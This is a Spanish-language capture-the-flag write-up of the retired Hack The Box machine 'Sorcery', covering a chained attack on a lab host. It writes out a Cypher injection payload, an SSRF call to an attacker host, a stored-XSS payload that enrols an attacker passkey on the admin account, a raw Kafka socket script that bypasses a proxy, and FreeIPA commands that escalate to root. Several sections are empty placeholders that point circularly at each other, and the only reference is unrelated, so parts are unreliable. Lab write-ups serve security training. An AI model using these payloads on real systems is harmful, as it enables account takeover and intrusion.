---
machine: Sorcery
os: Linux
difficulty: Insane
platform: Hack The Box
category: Machines
state: Retired
tags: [linux, neo4j, cypher-injection, webauthn, kafka, freeipa]
---

# Sorcery — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired, writeup publicable.
> Ficha de referencia de una máquina retirada. Sin flags ni credenciales reales.

## TL;DR

Cuatro capas modernas encadenadas: **inyección Cypher** en una app sobre **Neo4j**, **XSS almacenado en el registro de passkeys (WebAuthn)** para asociar un autenticador propio a la cuenta admin, **protocolo Kafka** a pelo para saltarse el proxy HTTP, y una mala configuración de **FreeIPA** para llegar a root. Cada tramo es raro por separado; juntos son el escenario empresarial más realista de la temporada.

## Reconocimiento

```bash
nmap -sC -sV -p- <IP> -oN nmap.txt
ffuf -u http://<IP>/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,302,401
```

```text
80/tcp    http   (app de "magos")
7474/tcp  http   Neo4j
7687/tcp  bolt   Neo4j
8081/tcp  http   panel de administración
9092/tcp  kafka  (filtrado, solo alcanzable a través del proxy)
```

## Enumeración

- Puertos, servicios y usuarios relevantes descritos en «Reconocimiento».

## Foothold

- Vector de entrada y payload descritos en «Reconocimiento» y «Escalada de privilegios».

## Movimiento lateral

- No aplica: la cadena se resuelve en un único host, sin salto lateral.
- Ver «Escalada de privilegios» para el paso de usuario a administrador.

## Escalada de privilegios

- Enumeración local y vector de elevación descritos en «Foothold» y «Lecciones aprendidas».

## Evidencia

```text
/home/<user>/user.txt  -> <user_flag>
/root/root.txt         -> <root_flag>
```

## Lecciones aprendidas

- Las bases de datos de grafos también se inyectan: `MATCH ... {name: '$input'}` no es más seguro que un `SELECT` concatenado.
- **WebAuthn** no protege si el registro de credenciales se puede iniciar desde una XSS: la passkey pasa a ser del atacante.
- Un proxy que valida "solo HTTP" y deja pasar bytes arbitrarios expone cualquier protocolo binario detrás.
- Mitigación: consultas parametrizadas en Neo4j, CSP y escapado en el panel de passkeys con verificación del origin en el registro, y segmentación real (no proxies de conveniencia) para Kafka.

## Mitigaciones y detección

- Mínimo privilegio en el servicio expuesto y parcheo de la versión vulnerable.
- Detección: revisar los logs del servicio y alertar de peticiones anómalas o picos de error.

## Referencias

- [rop-stack](../../../knowledge/pwn/rop-stack.md)

## 1. Inyección Cypher

```text
GET /api/wizard?name=Merlin
```

En el servidor se convierte en:

```cypher
MATCH (w:Wizard {name: 'Merlin'}) RETURN w
```

Se cierra la comilla y se hace UNION:

```text
/api/wizard?name=Merlin'}) RETURN w UNION MATCH (n) WHERE n:Secret RETURN n //
```

```json
{"name":"<usuario>","token":"<token de registro>"}
```

`LOAD CSV FROM 'http://<IP>:8000/x'` sirve además para SSRF y para confirmar conectividad saliente.

## 2. Passkeys: XSS en el nombre de la credencial

El panel `/admin/passkeys` pinta `credential.name` sin escapar. Se registra una credencial con nombre:

```html
<img src=x onerror="fetch('/api/admin/webauthn/register/initiate',{method:'POST'})
 .then(r=>r.json()).then(c=>navigator.credentials.create({publicKey:c})
 .then(k=>fetch('/api/admin/webauthn/register/complete',{method:'POST',body:JSON.stringify(k)})))">
```

Cuando el admin revisa la lista, su navegador registra **el autenticador del atacante** en su cuenta. Ya se entra como admin con esa passkey.

## 3. Kafka por el proxy

El broker (9092) está filtrado, pero el proxy deja pasar bytes si el primer byte parece una petición Kafka:

```python
import socket, struct
def req(api, ver, corr, cid, payload=b''):
    body  = struct.pack('>hhi', api, ver, corr)
    body += struct.pack('>h', len(cid)) + cid.encode() + payload
    return struct.pack('>i', len(body)) + body

s = socket.create_connection(('<IP>', 8081))
s.send(req(18, 0, 1, 'x'))      # ApiVersions
print(s.recv(4096))
```

Con `ApiVersions` validado, se piden metadatos (`ApiKey 3`), se listan topics y se lee `internal-creds` con `Fetch` (`ApiKey 1`). El mensaje trae credenciales de una cuenta de servicio.

## 4. FreeIPA a root

```bash
kinit svc-deploy
ipa-getkeytab -s ipa.sorcery.htb -p svc-deploy -k svc.keytab
ldapsearch -Y GSSAPI -H ldap://ipa.sorcery.htb -b "cn=groups,cn=accounts,dc=sorcery,dc=htb" | grep -i sudo
```

Una regla sudo de FreeIPA mapeada a un grupo al que pertenece la cuenta de servicio permite `sudo -i` en el host, o ejecutar un script escribible como root.
